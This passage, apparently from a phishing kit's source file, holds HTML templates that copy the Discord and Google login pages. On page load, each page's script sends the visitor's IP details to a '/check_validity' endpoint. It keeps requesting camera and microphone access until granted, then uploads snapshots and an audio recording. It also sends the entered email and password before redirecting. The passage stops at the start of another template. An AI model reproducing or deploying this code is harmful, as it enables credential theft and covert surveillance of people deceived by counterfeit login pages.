    </style>
</head>
<body>
    <!-- Logo Sol Üst Köşede -->
    <img src="/assets/dclogo.png" alt="Discord Logo" class="logo">

    <div class="container">
        <!-- Sol Taraf: E-posta/Telefon ve Şifre Girişi -->
        <div class="login-section">
            <h1>Welcome back!</h1>
            <div class="subtitle">We're so excited to see you again!</div>
            <div id="email-screen">
                <div class="input-container">
                    <input type="text" id="email-input" placeholder="Email or Phone Number" required>
                    <div id="email-error" class="error">Please enter a valid email or phone number</div>
                </div>
            </div>
            <div id="password-screen">
                <div class="input-container">
                    <input type="password" id="password-input" placeholder="Password" required>
                    <div id="password-error" class="error">Password cannot be empty</div>
                </div>
                <div class="forgot-link">
                    <a href="#">Forgot your password?</a>
                </div>
                <div class="buttons">
                    <button class="signin-btn" onclick="handleSignIn()">Log in</button>
                    <div class="create-account">
                        <a href="#">Need an account? Register</a>
                    </div>
                </div>
            </div>
        </div>

        <!-- Sağ Taraf: QR Kod (Sadece PC'de Görünecek) -->
        <div class="qr-section">
            <h1>Log in with QR Code</h1>
            <div class="subtitle">Scan this with the Discord mobile app to log in instantly</div>
            <div class="qr-code">
                <!-- Sahte QR kodu görseli -->
                <img src="/assets/dcqr.png" alt="QR Code">
            </div>
            <div class="qr-instruction">
                Open the Discord app on your phone, go to User Settings, and select "Scan QR Code".
            </div>
        </div>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://discord.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^(?:\S+@\S+\.\S+|\+\d{1,3}\d{10})$/; // E-posta veya telefon numarası için regex

            if (!emailInput) {
                emailError.textContent = "Email or phone number cannot be empty";
                emailError.style.display = 'block';
                return false;
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid email or phone number";
                emailError.style.display = 'block';
                return false;
            } else {
                emailError.style.display = 'none';
                return true;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const emailInput = document.getElementById('email-input').value;
            const passwordInput = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^(?:\S+@\S+\.\S+|\+\d{1,3}\d{10})$/; // E-posta veya telefon numarası için regex

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            // E-posta veya telefon numarası kontrolü
            if (!emailInput) {
                emailError.textContent = "Email or phone number cannot be empty";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            // Şifre kontrolü
            if (!passwordInput) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: emailInput, password: passwordInput }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Discord">
    <meta property="og:title" content="Discord - Group Chat That’s All Fun & Games">
    <meta property="og:description" content="Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.">
    <meta property="og:image" content="https://cdn.discordapp.com/assets/og_img_discord_home.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@discord">
    <meta name="twitter:creator" content="@discord">
    <title>Discord</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link href="/assets/favicon.ico" rel="icon">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            margin: 0;
            background: #1A1A1B; /* Varsayılan koyu tema arka planı */
            color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .logo {
            position: fixed; /* Sol üst köşede sabit */
            top: 40px;
            left: 40px;
            width: 150px;
            height: 25px;
            z-index: 1000; /* Diğer öğelerin üstünde */
        }
        .container {
            display: flex;
            flex-direction: row;
            width: 100%;
            max-width: 900px;
            background-color: #242526;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }
        .login-section, .qr-section {
            padding: 40px;
            box-sizing: border-box;
        }
        .login-section {
            flex: 1;
            background-color: #2F3136;
        }
        .qr-section {
            flex: 1;
            background-color: #242526;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border-left: 1px solid #343536;
        }
        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #A1A3A6;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #4A4B4C;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #343536;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #A1A3A6;
        }
        input:focus {
            border-color: #5865F2; /* Discord mavisi */
            box-shadow: 0 0 0 1px #5865F2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #5865F2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #5865F2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #5865F2; /* Discord mavisi */
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #4752C4; /* Daha koyu mavi */
        }
        .qr-code {
            width: 200px;
            height: 200px;
            background-color: #FFFFFF;
            border-radius: 8px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qr-code img {
            width: 100%;
            height: 100%;
            border-radius: 8px;
        }
        .qr-instruction {
            font-size: 14px;
            color: #A1A3A6;
            text-align: center;
        }
        .error {
            color: #FF5733;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }

        /* PC Versiyonu için Arka Plan Fotoğrafı */
        @media (min-width: 769px) {
            body {
                background: url('/assets/dcbg.jpg') no-repeat center center fixed;
                background-size: cover;
            }
        }

        /* Mobil Versiyon */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                max-width: 400px;
                margin: 20px;
            }
            .qr-section {
                display: none; /* Mobil versiyonda QR kodu gizle */
            }
            .login-section {
                border-left: none;
                padding: 20px;
            }
            .logo {
                width: 150px;
                height: 32px;
                top: 10px;
                left: 10px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            #email-screen, #password-screen {
                display: block !important; /* Mobil versiyonda her iki ekranı aynı anda göster */
            }
            .next-btn, .back-btn {
                display: none; /* Next ve Back butonlarını gizle */
            }
        }
    </style>
</head>
<body>
    <!-- Logo Sol Üst Köşede -->
    <img src="/assets/dclogo.png" alt="Discord Logo" class="logo">

    <div class="container">
        <!-- Sol Taraf: E-posta/Telefon ve Şifre Girişi -->
        <div class="login-section">
            <h1>Welcome back!</h1>
            <div class="subtitle">We're so excited to see you again!</div>
            <div id="email-screen">
                <div class="input-container">
                    <input type="text" id="email-input" placeholder="Email or Phone Number" required>
                    <div id="email-error" class="error">Please enter a valid email or phone number</div>
                </div>
            </div>
            <div id="password-screen">
                <div class="input-container">
                    <input type="password" id="password-input" placeholder="Password" required>
                    <div id="password-error" class="error">Password cannot be empty</div>
                </div>
                <div class="forgot-link">
                    <a href="#">Forgot your password?</a>
                </div>
                <div class="buttons">
                    <button class="signin-btn" onclick="handleSignIn()">Log in</button>
                    <div class="create-account">
                        <a href="#">Need an account? Register</a>
                    </div>
                </div>
            </div>
        </div>

        <!-- Sağ Taraf: QR Kod (Sadece PC'de Görünecek) -->
        <div class="qr-section">
            <h1>Log in with QR Code</h1>
            <div class="subtitle">Scan this with the Discord mobile app to log in instantly</div>
            <div class="qr-code">
                <!-- Sahte QR kodu görseli -->
                <img src="/assets/dcqr.png" alt="QR Code">
            </div>
            <div class="qr-instruction">
                Open the Discord app on your phone, go to User Settings, and select "Scan QR Code".
            </div>
        </div>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://discord.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^(?:\S+@\S+\.\S+|\+\d{1,3}\d{10})$/; // E-posta veya telefon numarası için regex

            if (!emailInput) {
                emailError.textContent = "Email or phone number cannot be empty";
                emailError.style.display = 'block';
                return false;
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid email or phone number";
                emailError.style.display = 'block';
                return false;
            } else {
                emailError.style.display = 'none';
                return true;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const emailInput = document.getElementById('email-input').value;
            const passwordInput = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^(?:\S+@\S+\.\S+|\+\d{1,3}\d{10})$/; // E-posta veya telefon numarası için regex

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            // E-posta veya telefon numarası kontrolü
            if (!emailInput) {
                emailError.textContent = "Email or phone number cannot be empty";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Please enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            // Şifre kontrolü
            if (!passwordInput) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: emailInput, password: passwordInput }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "gl1": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f7f7f7; /* Subtle off-white background like Google's */
        }
        .container {
            width: 100%;
            max-width: 450px; /* Slightly adjusted for Google's exact width */
            padding: 40px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1); /* Subtle shadow for depth */
            box-sizing: border-box;
            margin: 24px;
            background-color: #fff;
        }
        .logo {
            display: block;
            margin: 0 auto 24px;
            width: 92px; /* Matches Google's logo size */
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin: 0 0 10px;
            letter-spacing: -0.1px; /* Mimics Google's typography */
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 32px; /* More spacing for realism */
            line-height: 20px;
        }
        .input-container {
            margin-bottom: 24px;
            position: relative;
        }
        input {
            width: 100%;
            padding: 14px 16px; /* Adjusted padding for Google's input fields */
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s; /* Smooth transition */
        }
        input:focus {
            border-color: #1a73e8; /* Google's blue */
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2); /* Softer focus ring */
        }
        .forgot-link {
            margin: 8px 0 24px; /* Adjusted spacing */
        }
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500; /* Bolder for emphasis */
        }
        .forgot-link a:hover {
            text-decoration: underline; /* Hover effect like Google's */
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }
        .create-account a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .create-account a:hover {
            text-decoration: underline; /* Hover effect */
        }
        .next-btn, .signin-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s; /* Smooth hover transition */
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #1557b0; /* Darker blue for hover */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
            padding: 16px 0; /* More padding for balance */
            background-color: #f7f7f7;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 12px; /* Wider spacing */
        }
        .footer a:hover {
            text-decoration: underline; /* Hover effect */
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
            display: none;
            line-height: 16px;
        }
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
                margin: 16px;
                border: none;
                box-shadow: none; /* No shadow on mobile */
            }
            .logo {
                width: 75px; /* Slightly smaller on mobile */
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
            .buttons {
                flex-direction: column-reverse; /* Button below link on mobile */
                align-items: flex-end;
                gap: 16px;
            }
            .create-account {
                margin-bottom: 16px;
            }
            .footer {
                font-size: 11px;
                padding: 12px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email or phone" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot email?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Welcome</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Enter your password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "mol0": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
